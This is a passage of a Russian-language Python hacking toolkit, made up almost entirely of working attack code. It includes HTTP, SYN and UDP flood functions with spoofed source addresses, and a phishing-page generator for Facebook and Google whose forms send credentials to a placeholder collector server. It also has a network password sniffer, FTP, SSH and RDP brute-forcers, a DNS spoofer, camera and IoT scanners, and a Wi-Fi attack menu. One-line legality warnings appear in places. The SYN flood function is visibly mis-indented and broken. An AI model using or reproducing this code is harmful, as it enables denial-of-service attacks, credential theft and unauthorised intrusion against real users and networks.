        hosts_to_scan = [f"{network_prefix}.{i}" for i in range(1, 255)]

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(scan_host, ip): ip for ip in hosts_to_scan}

            for future in as_completed(futures):
                ip, open_ports = future.result()
                if open_ports:
                    try:
                        hostname = socket.gethostbyaddr(ip)[0]
                    except:
                        hostname = "N/A"

                    active_hosts.append((ip, hostname, open_ports))
                    print(Fore.GREEN + f"[+] Найден активный хост: {ip} ({hostname})")

        # Вывод результатов
        print(Fore.CYAN + "\n[+] Результаты сканирования:")
        if active_hosts:
            table = PrettyTable()
            table.field_names = ["IP Address", "Hostname", "Open Ports"]

            for ip, hostname, ports in active_hosts:
                port_info = ", ".join([f"{port}/{service}" for port, service in ports])
                table.add_row([ip, hostname, port_info])

            print(table)

            # Сохранение результатов
            with open("network_scan_results.txt", "w") as f:
                f.write(str(table))
            print(Fore.GREEN + "\n[+] Результаты сохранены в network_scan_results.txt")
        else:
            print(Fore.RED + "[-] Активные хосты не обнаружены")

    except Exception as e:
        print(Fore.RED + f"[-] Ошибка сканирования: {str(e)}")


def ddos_menu():
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.RED + "               DDOS Tools \n")
            print(Fore.WHITE + "1. HTTP Flood")
            print(Fore.WHITE + "2. TCP SYN Flood")
            print(Fore.WHITE + "3. UDP Flood")
            print(Fore.WHITE + "0. Назад")

            try:
                choice = input("\nВыберите опцию: ").strip()
            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n[!] Для выхода введите 0 или зажмите Ctrl+C")
                continue

            if choice == "1":
                target = input("Введите URL цели (например http://example.com): ")
                threads = int(input("Количество потоков (рекомендуется 50-100): "))
                duration = int(input("Длительность атаки в секундах: "))
                http_flood(target, threads, duration)
            elif choice == "2":
                target = input("Введите IP цели: ")
                port = int(input("Введите порт цели: "))
                duration = int(input("Длительность атаки в секундах: "))
                syn_flood(target, port, duration)
            elif choice == "3":
                target = input("Введите IP цели: ")
                port = int(input("Введите порт цели: "))
                duration = int(input("Длительность атаки в секундах: "))
                udp_flood(target, port, duration)
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()


def http_flood(target, threads=50, duration=30):
    """HTTP Flood атака"""
    print(Fore.RED + f"\n[!] Начинаем HTTP Flood на {target} с {threads} потоками на {duration} секунд")

    # Список User-Agent для рандомизации
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
    ]

    stop_flag = False
    requests_sent = 0

    def attack():
        nonlocal requests_sent
        while not stop_flag:
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive"
                }
                requests.get(target, headers=headers, timeout=5)
                requests_sent += 1
                print(Fore.GREEN + f"[+] Отправлен запрос #{requests_sent}", end='\r')
            except:
                continue

    # Запускаем потоки
    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        threads_list.append(t)
        t.start()

    # Останавливаем через duration секунд
    time.sleep(duration)
    stop_flag = True

    print(Fore.YELLOW + f"\n[!] Атака завершена. Всего отправлено запросов: {requests_sent}")


def syn_flood(target_ip, target_port, duration=30):
    """TCP SYN Flood атака"""
    print(Fore.RED + f"\n[!] Начинаем TCP SYN Flood на {target_ip}:{target_port} на {duration} секунд")

    stop_flag = False
    packets_sent = 0

    def attack():
        nonlocal packets_sent
        while not stop_flag:
            try:
                # Генерируем случайный исходный IP (исправленный синтаксис)
                src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                src_port = random.randint(1024, 65535)

                # Создаем IP и TCP пакеты
                ip_packet = scapy.IP(src=src_ip, dst=target_ip)
                tcp_packet = scapy.TCP(sport=src_port, dport=target_port, flags="S")

                # Отправляем пакет
                scapy.send(ip_packet / tcp_packet, verbose=0)
                packets_sent += 1
                print(Fore.GREEN + f"[+] Отправлен SYN пакет #{packets_sent}", end='\r')
            except:
                continue

        # Запускаем потоки
        threads_list = []
        for i in range(50):  # Меньше потоков, так как scapy сам по себе эффективен
            t = threading.Thread(target=attack)
            t.daemon = True
            threads_list.append(t)
            t.start()

        # Останавливаем через duration секунд
        time.sleep(duration)
        stop_flag = True

        print(Fore.YELLOW + f"\n[!] Атака завершена. Всего отправлено SYN пакетов: {packets_sent}")


def udp_flood(target_ip, target_port, duration=30):
    """UDP Flood атака"""
    print(Fore.RED + f"\n[!] Начинаем UDP Flood на {target_ip}:{target_port} на {duration} секунд")

    stop_flag = False
    packets_sent = 0

    def attack():
        nonlocal packets_sent
        while not stop_flag:
            try:
                # Генерируем случайный исходный IP (исправленный синтаксис)
                src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                src_port = random.randint(1024, 65535)

                # Создаем IP и UDP пакеты
                ip_packet = scapy.IP(src=src_ip, dst=target_ip)
                udp_packet = scapy.UDP(sport=src_port, dport=target_port)

                # Добавляем случайные данные
                random_data = bytes([random.getrandbits(8) for _ in range(1024)])

                # Отправляем пакет
                scapy.send(ip_packet / udp_packet / random_data, verbose=0)
                packets_sent += 1
                print(Fore.GREEN + f"[+] Отправлен UDP пакет #{packets_sent}", end='\r')
            except:
                continue

    # Запускаем потоки
    threads_list = []
    for i in range(50):  # Меньше потоков, так как scapy сам по себе эффективен
        t = threading.Thread(target=attack)
        t.daemon = True
        threads_list.append(t)
        t.start()

    # Останавливаем через duration секунд
    time.sleep(duration)
    stop_flag = True

    print(Fore.YELLOW + f"\n[!] Атака завершена. Всего отправлено UDP пакетов: {packets_sent}")


def phishing_generator():
    """Генератор фишинговых страниц"""
    print(Fore.CYAN + "\nГенератор фишинговых страниц")

    templates = {
        "1": ("Facebook", "facebook.html"),
        "2": ("Google", "google.html"),
        "3": ("ВКонтакте", "vkontakte.html"),
        "4": ("Steam", "steam.html"),
        "5": ("Яндекс", "yandex.html")
    }

    print(Fore.YELLOW + "\nДоступные шаблоны:")
    for key, (name, _) in templates.items():
        print(f"{key}. {name}")

    choice = input("\nВыберите шаблон: ")
    if choice not in templates:
        print(Fore.RED + "[-] Неверный выбор")
        return

    template_name, template_file = templates[choice]
    output_file = input("Введите имя для выходного файла (например: login.html): ")

    # Базовые шаблоны (в реальном коде здесь были бы HTML файлы)
    templates_content = {
        "facebook.html": """<html>
<head><title>Facebook Login</title></head>
<body>
<form action="http://your-server.com/collect.php" method="POST">
<input type="text" name="email" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<input type="submit" value="Log In">
</form>
</body>
</html>""",
        "google.html": """<html>
<head><title>Google Login</title></head>
<body>
<form action="http://your-server.com/collect.php" method="POST">
<input type="text" name="email" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<input type="submit" value="Sign In">
</form>
</body>
</html>"""
    }

    try:
        with open(output_file, "w") as f:
            f.write(templates_content.get(template_file, "<!-- Template not found -->"))

        print(Fore.GREEN + f"\n[+] Фишинговая страница {template_name} создана: {output_file}")
        print(Fore.YELLOW + "[!] Внимание: Использование фишинговых страниц без разрешения является незаконным!")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def vulnerability_scanner():
    """Сканер уязвимостей собственной сети"""
    print(Fore.CYAN + "\nСканер уязвимостей локальной сети")

    try:
        # Определяем локальную подсеть
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        network_prefix = '.'.join(local_ip.split('.')[:3])

        print(Fore.GREEN + f"[+] Ваш IP: {local_ip}")
        print(Fore.YELLOW + f"[*] Сканирую подсеть {network_prefix}.1-254...")

        # Используем nmap для сканирования
        nm = nmap.PortScanner()
        nm.scan(hosts=f"{network_prefix}.1-254", arguments='-sV -T4 --open')

        vulnerabilities_found = False

        for host in nm.all_hosts():
            if nm[host].state() == 'up':
                print(Fore.CYAN + f"\n[+] Хост: {host} ({nm[host].hostname()})")

                for proto in nm[host].all_protocols():
                    print(Fore.YELLOW + f"  Протокол: {proto}")

                    ports = nm[host][proto].keys()
                    for port in sorted(ports):
                        service = nm[host][proto][port]
                        print(
                            f"  Порт: {port}\tСостояние: {service['state']}\tСервис: {service['name']} {service['version']}")

                        # Проверка известных уязвимостей
                        if check_vulnerabilities(service['name'], service['version']):
                            print(Fore.RED + "    [!] Возможные уязвимости:")
                            for vuln in check_vulnerabilities(service['name'], service['version']):
                                print(f"    - {vuln}")
                            vulnerabilities_found = True

        if not vulnerabilities_found:
            print(Fore.GREEN + "\n[+] Критических уязвимостей не обнаружено")
        else:
            print(Fore.RED + "\n[!] Обнаружены потенциальные уязвимости!")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка сканирования: {str(e)}")


def check_vulnerabilities(service, version):
    """Проверка известных уязвимостей (упрощенная версия)"""
    vulnerabilities = {
        ("ftp", "2.3.4"): ["CVE-2011-2523 - Уязвимость в vsftpd позволяет получить root-доступ"],
        ("ssh", "7.2"): ["CVE-2016-8858 - Уязвимость в OpenSSH"],
        ("http", "1.0"): ["Устаревшая версия HTTP подвержена множеству атак"],
        ("microsoft-ds", "6.1"): ["EternalBlue - Уязвимость в SMB"]
    }

    return vulnerabilities.get((service.lower(), version), [])


def password_sniffer():
    """Сниффер паролей для Windows"""
    print(Fore.RED + "\n[!] Сниффер паролей (Windows)")
    print(Fore.YELLOW + "[!] Внимание: Перехват паролей без разрешения является незаконным!")

    try:
        # Получаем список интерфейсов Windows
        interfaces = scapy.get_windows_if_list()
        if not interfaces:
            print(Fore.RED + "[-] Не найдены сетевые интерфейсы!")
            return

        # Выводим список интерфейсов
        print(Fore.CYAN + "\nДоступные интерфейсы:")
        for idx, iface in enumerate(interfaces):
            print(f"{idx + 1}. {iface['name']} - {iface['description']}")

        # Выбор интерфейса
        try:
            choice = int(input("\nВыберите номер интерфейса: ")) - 1
            if choice < 0 or choice >= len(interfaces):
                raise ValueError
            interface = interfaces[choice]['name']
        except:
            print(Fore.RED + "[-] Неверный выбор интерфейса")
            return

        # Ввод времени сниффинга
        try:
            timeout = int(input("Время сниффинга в секундах (по умолчанию 30): ") or "30")
        except:
            print(Fore.RED + "[-] Неверное время, используется 30 секунд")
            timeout = 30

        print(Fore.YELLOW + f"\n[*] Захват трафика на интерфейсе {interface} ({timeout} сек)...")
        print(Fore.RED + "[!] Нажмите Ctrl+C для остановки")

        passwords = set()

        def packet_callback(packet):
            if packet.haslayer(http.HTTPRequest):
                http_req = packet[http.HTTPRequest]
                if packet.haslayer(scapy.Raw):
                    load = packet[scapy.Raw].load
                    # Ищем параметры с паролями
                    if b'password=' in load or b'pass=' in load:
                        params = load.split(b'&')
                        for param in params:
                            if param.startswith(b'password=') or param.startswith(b'pass='):
                                pwd = param.split(b'=')[1].decode('utf-8', 'ignore')
                                if pwd not in passwords:
                                    passwords.add(pwd)
                                    print(Fore.RED + f"[!] Найден пароль: {pwd}")

        # Запуск сниффинга
        scapy.sniff(iface=interface, prn=packet_callback, store=0, timeout=timeout)

        # Результаты
        print(Fore.YELLOW + "\n[+] Сниффинг завершен")
        if passwords:
            print(Fore.RED + "[!] Обнаруженные пароли:")
            for pwd in sorted(passwords):
                print(f"- {pwd}")
        else:
            print(Fore.GREEN + "[+] Пароли не обнаружены")

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Остановлено пользователем")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def brute_force_menu():
    """Меню брутфорса"""
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.RED + "               Brute Force Tools \n")
            print(Fore.WHITE + "1. FTP Brute Force")
            print(Fore.WHITE + "2. SSH Brute Force")
            print(Fore.WHITE + "3. RDP Brute Force (Hydra)")
            print(Fore.WHITE + "0. Назад")

            try:
                choice = input("\nВыберите опцию: ").strip()
            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n[!] Для выхода введите 0 или зажмите Ctrl+C")
                continue

            if choice == "1":
                target = input("Введите IP или хост FTP сервера: ")
                port = input("Введите порт (по умолчанию 21): ") or "21"
                username = input("Введите имя пользователя или путь к файлу с логинами: ")
                password_file = input("Введите путь к файлу с паролями: ")
                ftp_brute(target, port, username, password_file)
            elif choice == "2":
                target = input("Введите IP или хост SSH сервера: ")
                port = input("Введите порт (по умолчанию 22): ") or "22"
                username = input("Введите имя пользователя или путь к файлу с логинами: ")
                password_file = input("Введите путь к файлу с паролями: ")
                ssh_brute(target, port, username, password_file)
            elif choice == "3":
                target = input("Введите IP или хост RDP сервера: ")
                username = input("Введите имя пользователя или путь к файлу с логинами: ")
                password_file = input("Введите путь к файлу с паролями: ")
                rdp_brute(target, username, password_file)
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()


def ftp_brute(target, port, username, password_file):
    """Брутфорс FTP сервера"""
    print(Fore.RED + f"\n[!] Начинаем брутфорс FTP на {target}:{port}")

    try:
        # Проверяем, является ли username файлом
        if os.path.isfile(username):
            with open(username, 'r') as f:
                usernames = [line.strip() for line in f]
        else:
            usernames = [username]

        # Загружаем пароли
        if not os.path.isfile(password_file):
            print(Fore.RED + "[-] Файл с паролями не найден")
            return

        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f]

        found = False

        for user in usernames:
            if found:
                break
            for password in passwords:
                try:
                    ftp = FTP()
                    ftp.connect(target, int(port), timeout=5)
                    ftp.login(user, password)
                    print(Fore.GREEN + f"\n[+] Успешно! Логин: {user} Пароль: {password}")
                    ftp.quit()
                    found = True
                    break
                except Exception as e:
                    print(Fore.RED + f"[-] Неверно: {user}:{password}", end='\r')
                    continue

        if not found:
            print(Fore.RED + "\n[-] Подходящая комбинация не найдена")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def ssh_brute(target, port, username, password_file):
    """Брутфорс SSH сервера"""
    print(Fore.RED + f"\n[!] Начинаем брутфорс SSH на {target}:{port}")

    try:
        # Проверяем, является ли username файлом
        if os.path.isfile(username):
            with open(username, 'r') as f:
                usernames = [line.strip() for line in f]
        else:
            usernames = [username]

        # Загружаем пароли
        if not os.path.isfile(password_file):
            print(Fore.RED + "[-] Файл с паролями не найден")
            return

        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f]

        found = False

        for user in usernames:
            if found:
                break
            for password in passwords:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(target, port=int(port), username=user, password=password, timeout=5)
                    print(Fore.GREEN + f"\n[+] Успешно! Логин: {user} Пароль: {password}")
                    ssh.close()
                    found = True
                    break
                except Exception as e:
                    print(Fore.RED + f"[-] Неверно: {user}:{password}", end='\r')
                    continue

        if not found:
            print(Fore.RED + "\n[-] Подходящая комбинация не найдена")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def rdp_brute(target, username, password_file):
    """Брутфорс RDP с использованием hydra (должна быть установлена)"""
    print(Fore.RED + f"\n[!] Начинаем брутфорс RDP на {target}")

    try:
        # Проверяем, установлена ли hydra
        subprocess.run(["hydra", "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Проверяем, является ли username файлом
        user_param = "-L" if os.path.isfile(username) else "-l"

        # Запускаем hydra
        cmd = [
            "hydra",
            "-t", "4",
            "-V",
            user_param, username,
            "-P", password_file,
            "rdp://" + target
        ]

        print(Fore.YELLOW + "[*] Запуск команды: " + " ".join(cmd))
        subprocess.run(cmd)

    except FileNotFoundError:
        print(Fore.RED + "[-] Hydra не установлена. Установите ее для использования этой функции.")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def dns_spoofing():
    """Инструмент для подмены DNS (DNS Spoofing)"""
    print(Fore.RED + "\n[!] Инструмент для подмены DNS (DNS Spoofing)")
    print(Fore.YELLOW + "[!] Внимание: Для работы требуется запуск от root и установленный scapy")

    try:
        target_domain = input("Введите домен для подмены (например google.com): ")
        spoof_ip = input("Введите IP для подмены (например 192.168.1.100): ")
        interface = input("Введите сетевой интерфейс (например eth0): ")

        print(Fore.YELLOW + f"[*] Начинаем подмену DNS для {target_domain} -> {spoof_ip}")
        print(Fore.RED + "[!] Нажмите Ctrl+C для остановки")

        def dns_callback(packet):
            if packet.haslayer(scapy.DNSQR):  # DNS Question Record
                if target_domain in str(packet[scapy.DNSQR].qname):
                    print(Fore.GREEN + f"[+] Обнаружен DNS запрос для {target_domain}")

                    # Создаем поддельный DNS ответ
                    spoofed_pkt = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
                                  scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
                                  scapy.DNS(
                                      id=packet[scapy.DNS].id,
                                      qd=packet[scapy.DNS].qd,
                                      aa=1,
                                      qr=1,
                                      an=scapy.DNSRR(
                                          rrname=packet[scapy.DNSQR].qname,
                                          ttl=10,
                                          rdata=spoof_ip
                                      )
                                  )

                    scapy.send(spoofed_pkt, verbose=0)
                    print(Fore.RED + f"[!] Отправлен поддельный DNS ответ: {target_domain} -> {spoof_ip}")

        scapy.sniff(iface=interface, filter="udp port 53", prn=dns_callback, store=0)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Остановлено пользователем")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def camera_scanner():
    """Сканер удаленных камер/устройств"""
    print(Fore.CYAN + "\nСканер удаленных камер и устройств")

    try:
        target = input("Введите IP или диапазон IP (например 192.168.1.1 или 192.168.1.1-100): ")
        ports = input("Введите порты для проверки (через запятую, по умолчанию 80,554,37777): ") or "80,554,37777"
        ports = [int(p.strip()) for p in ports.split(",")]

        print(Fore.YELLOW + f"[*] Сканирую {target} на открытые порты камер...")

        nm = nmap.PortScanner()
        nm.scan(hosts=target, ports=",".join(map(str, ports)), arguments='-T4 --open')

        cameras_found = False

        for host in nm.all_hosts():
            if nm[host].state() == 'up':
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        service = nm[host][proto][port]['name']
                        if service in ['http', 'rtsp', 'unknown']:
                            print(Fore.GREEN + f"\n[+] Возможная камера обнаружена: {host}:{port} ({service})")
                            print(Fore.YELLOW + f"    Попробуйте открыть в браузере: http://{host}:{port}")
                            cameras_found = True

        if not cameras_found:
            print(Fore.RED + "\n[-] Камеры не обнаружены")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка сканирования: {str(e)}")


def traffic_analyzer(interface='eth0', timeout=30):
    """Анализатор зашифрованного трафика"""
    print(Fore.CYAN + "\nАнализатор зашифрованного трафика")
    print(Fore.YELLOW + "[!] Внимание: Для работы требуется запуск от root и установленный scapy, dpkt")

    try:
        print(Fore.YELLOW + f"[*] Начинаем анализ трафика на интерфейсе {interface}...")
        print(Fore.RED + "[!] Нажмите Ctrl+C для остановки")

        packets = []
        stop_sniffing = False

        def packet_callback(packet):
            if not stop_sniffing:
                packets.append(packet)

        sniffer = threading.Thread(target=lambda: scapy.sniff(iface=interface, prn=packet_callback, store=0))
        sniffer.start()

        time.sleep(timeout)
        stop_sniffing = True
        sniffer.join()

        print(Fore.YELLOW + f"\n[+] Захвачено {len(packets)} пакетов. Анализируем...")

        # Анализ TLS/SSL соединений
        ssl_connections = {}
        for pkt in packets:
            if pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw):
                try:
                    # Попытка анализа как TLS
                    tls = dpkt.ssl.TLS(pkt[scapy.Raw].load)
                    if tls.type == dpkt.ssl.TLS_HANDSHAKE and isinstance(tls.data, dpkt.ssl.TLSHandshake):
                        if isinstance(tls.data.data, dpkt.ssl.TLSClientHello):
                            server_name = None
                            for ext in tls.data.data.extensions:
                                if isinstance(ext, dpkt.ssl.TLSExtServerName):
                                    server_name = ext.data.decode('utf-8')
                                    break
                            if server_name:
                                ssl_connections[pkt[scapy.TCP].dport] = server_name
                except:
                    continue

        if ssl_connections:
            print(Fore.GREEN + "\n[+] Обнаружены SSL/TLS соединения:")
            for port, name in ssl_connections.items():
                print(f"  Порт: {port} -> Сервер: {name}")
        else:
            print(Fore.RED + "\n[-] SSL/TLS соединения не обнаружены")

        # Анализ частоты и размера пакетов
        if packets:
            sizes = [len(p) for p in packets]
            avg_size = sum(sizes) / len(sizes)
            print(Fore.YELLOW + f"\n[+] Средний размер пакета: {avg_size:.2f} байт")

            # Поиск аномалий
            if avg_size > 1000:
                print(Fore.RED + "[!] Большой средний размер пакета - возможна передача файлов")
            elif avg_size < 100:
                print(Fore.RED + "[!] Маленький средний размер пакета - возможен командный канал")

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Остановлено пользователем")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def advanced_wifi_scanner(interface='wlan0'):
    """Расширенный сканер беспроводных сетей"""
    print(Fore.CYAN + "\nРасширенный сканер WiFi сетей")
    print(Fore.YELLOW + "[!] Внимание: Для работы требуется запуск от root и установленный aircrack-ng")

    try:
        # Проверяем, поддерживает ли интерфейс мониторный режим
        print(Fore.YELLOW + "[*] Проверяем интерфейс...")
        subprocess.run(["airmon-ng", "check", "kill"], check=True)
        subprocess.run(["airmon-ng", "start", interface], check=True)
        monitor_iface = interface + "mon"

        print(Fore.YELLOW + f"[*] Запускаем сканирование на {monitor_iface}...")
        print(Fore.RED + "[!] Нажмите Ctrl+C для остановки")

        # Запускаем airodump-ng для сканирования сетей
        with open("wifi_scan.txt", "w") as f:
            process = subprocess.Popen(["airodump-ng", monitor_iface], stdout=f, stderr=subprocess.PIPE)

        try:
            time.sleep(10)  # Сканируем 10 секунд
            process.terminate()
        except:
            pass

        # Читаем результаты
        with open("wifi_scan.txt", "r") as f:
            lines = f.readlines()

        # Парсим результаты
        networks = []
        for line in lines:
            if "BSSID" in line:  # Это заголовок
                continue

            parts = line.strip().split()
            if len(parts) >= 10:
                networks.append({
                    'BSSID': parts[0],
                    'Channel': parts[5],
                    'Encryption': parts[6],
                    'ESSID': " ".join(parts[13:])
                })

        # Выводим результаты
        if networks:
            table = PrettyTable()
            table.field_names = ["BSSID", "Channel", "Encryption", "ESSID"]
            for net in networks:
                table.add_row([net['BSSID'], net['Channel'], net['Encryption'], net['ESSID']])

            print(Fore.GREEN + "\n[+] Обнаруженные WiFi сети:")
            print(table)

            # Сохраняем в файл
            with open("wifi_networks.txt", "w") as f:
                f.write(str(table))
            print(Fore.GREEN + "\n[+] Результаты сохранены в wifi_networks.txt")
        else:
            print(Fore.RED + "\n[-] WiFi сети не обнаружены")

        # Возвращаем интерфейс в обычный режим
        subprocess.run(["airmon-ng", "stop", monitor_iface], check=True)

    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Ошибка выполнения команды: {e.stderr.decode()}")
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Остановлено пользователем")
        subprocess.run(["airmon-ng", "stop", monitor_iface], check=True)
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")
        subprocess.run(["airmon-ng", "stop", monitor_iface], check=True)


def iot_scanner():
    """Сканер уязвимых IoT устройств в локальной сети"""
    print(Fore.CYAN + "\n[+] Сканер IoT устройств")

    try:
        # Определяем локальную подсеть
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        network_prefix = '.'.join(local_ip.split('.')[:3])

        print(Fore.GREEN + f"[+] Ваш IP: {local_ip}")
        print(Fore.YELLOW + f"[*] Сканирую подсеть {network_prefix}.1-254 на IoT устройства...")

        # Характерные порты IoT устройств
        iot_ports = {
            80: "HTTP (веб-интерфейс)",
            443: "HTTPS (защищенный веб)",
            8080: "Альтернативный веб-интерфейс",
            8883: "MQTT (IoT протокол)",
            1883: "MQTT (без шифрования)",
            554: "RTSP (камеры)",
            23: "Telnet (небезопасный доступ)",
            22: "SSH (безопасный доступ)",
            49152: "UPnP (уязвимый протокол)"
        }

        found_devices = []
        hosts_to_scan = [f"{network_prefix}.{i}" for i in range(1, 255)]

        def check_iot_ports(ip):
            open_ports = []
            for port, service in iot_ports.items():
                if check_port(ip, port):
                    open_ports.append((port, service))
            return ip, open_ports

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(check_iot_ports, ip): ip for ip in hosts_to_scan}

            for future in as_completed(futures):
                ip, ports = future.result()
                if ports:
                    try:
                        hostname = socket.gethostbyaddr(ip)[0]
                    except:
                        hostname = "Unknown"

                    # Определяем тип устройства по открытым портам
                    device_type = "Generic IoT"
                    if any(p[0] in [554, 8883] for p in ports):
                        device_type = "Camera"
                    elif any(p[0] in [1883, 8883] for p in ports):
                        device_type = "Smart Home Hub"
                    elif any(p[0] == 23 for p in ports):
                        device_type = "Router/Embedded Device"

                    found_devices.append((ip, hostname, device_type, ports))
                    print(Fore.GREEN + f"[+] Обнаружено IoT устройство: {ip} ({device_type})")

        # Вывод результатов
        print(Fore.CYAN + "\n[+] Результаты сканирования IoT:")
        if found_devices:
            table = PrettyTable()
            table.field_names = ["IP Address", "Hostname", "Device Type", "Open Ports"]

            for ip, hostname, dev_type, ports in found_devices:
                port_info = ", ".join([f"{port}/{service}" for port, service in ports])
                table.add_row([ip, hostname, dev_type, port_info])

            print(table)

            # Проверка уязвимостей
            print(Fore.YELLOW + "\n[!] Проверка известных уязвимостей:")
            for ip, hostname, dev_type, ports in found_devices:
                vulnerabilities = []

                # Проверка на Telnet без пароля
                if any(p[0] == 23 for p in ports):
                    vulnerabilities.append("Telnet доступ без аутентификации")

                # Проверка на стандартные учетные данные
                if any(p[0] in [80, 443, 8080] for p in ports):
                    vulnerabilities.append("Возможны стандартные логин/пароль (admin/admin)")

                # Проверка UPnP
                if any(p[0] == 49152 for p in ports):
                    vulnerabilities.append("Уязвимость UPnP (CVE-2020-12695)")

                if vulnerabilities:
                    print(Fore.RED + f"[!] Уязвимости {ip} ({dev_type}):")
                    for vuln in vulnerabilities:
                        print(f"  - {vuln}")

            # Сохранение результатов
            with open("iot_scan_results.txt", "w") as f:
                f.write(str(table))
            print(Fore.GREEN + "\n[+] Результаты сохранены в iot_scan_results.txt")
        else:
            print(Fore.RED + "[-] IoT устройства не обнаружены")

    except Exception as e:
        print(Fore.RED + f"[-] Ошибка сканирования: {str(e)}")


def wireless_exploits_menu():
    """Меню для работы с беспроводными сетями"""
    clear_screen()
    print_banner()

    while True:
        try:
            print("\n" + Fore.YELLOW + "=" * 50)
            print(Back.CYAN + "          Эксплойты беспроводных сетей \n")
            print(Fore.WHITE + "1. Сканировать Wi-Fi сети")
            print(Fore.WHITE + "2. Атака на WPS (Wi-Fi Protected Setup)")
            print(Fore.WHITE + "3. Перехват рукопожатия WPA/WPA2")
            print(Fore.WHITE + "4. Атака по словарю на пароль Wi-Fi")
            print(Fore.WHITE + "5. Создать точку доступа Evil Twin")
            print(Fore.WHITE + "0. Назад")

            choice = input("\nВыберите опцию: ").strip()

            if choice == "1":
                scan_wifi_networks()
            elif choice == "2":
                wps_attack()
            elif choice == "3":
                capture_wpa_handshake()
            elif choice == "4":
                crack_wifi_password()
            elif choice == "5":
                evil_twin_attack()
            elif choice == "0":
                return
            else:
                print(Fore.RED + "\n[-] Неверный выбор. Попробуйте снова.")

        except Exception as e:
            print(Fore.RED + f"\n[-] Ошибка: {str(e)}")

        input("\nНажмите Enter для продолжения...")
        clear_screen()


def scan_wifi_networks():
    """Сканирование доступных Wi-Fi сетей"""
    print(Fore.CYAN + "\n[+] Сканирование Wi-Fi сетей")

    try:
        if os.name == 'nt':
            print(Fore.RED + "[-] Эта функция доступна только в Linux")
            return

        # Используем scapy для сканирования Wi-Fi сетей
        networks = []

        def packet_handler(packet):
            if packet.haslayer(Dot11Beacon):
                ssid = packet[Dot11Elt].info.decode()
                bssid = packet[Dot11].addr2
                channel = int(ord(packet[Dot11Elt:3].info))
                try:
                    dbm_signal = packet.dBm_AntSignal
                except:
                    dbm_signal = "N/A"
                networks.append((ssid, bssid, channel, dbm_signal))

        print(Fore.YELLOW + "[*] Сканирование... Нажмите Ctrl+C для остановки")
        sniff(iface="wlan0", prn=packet_handler, timeout=30)

        # Вывод результатов
        if networks:
            print(Fore.GREEN + "\n[+] Обнаруженные сети:")
            table = PrettyTable()
            table.field_names = ["SSID", "BSSID", "Channel", "Signal"]
            for ssid, bssid, channel, signal in networks:
                table.add_row([ssid, bssid, channel, signal])
            print(table)
        else:
            print(Fore.RED + "[-] Сети не обнаружены")

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Сканирование остановлено")
    except Exception as e:
        print(Fore.RED + f"[-] Ошибка: {str(e)}")


def wps_attack():
    """Атака на WPS для восстановления PIN"""
    print(Fore.CYAN + "\n[+] Атака на WPS (Wi-Fi Protected Setup)")

    try:
        if os.name == 'nt':
            print(Fore.RED + "[-] Эта функция доступна только в Linux")
            return

        bssid = input("Введите BSSID цели: ")
        interface = input("Введите интерфейс (по умолчанию wlan0): ") or "wlan0"

        print(Fore.YELLOW + f"[*] Запуск атаки на {bssid}...")

        # Используем Reaver для атаки на WPS
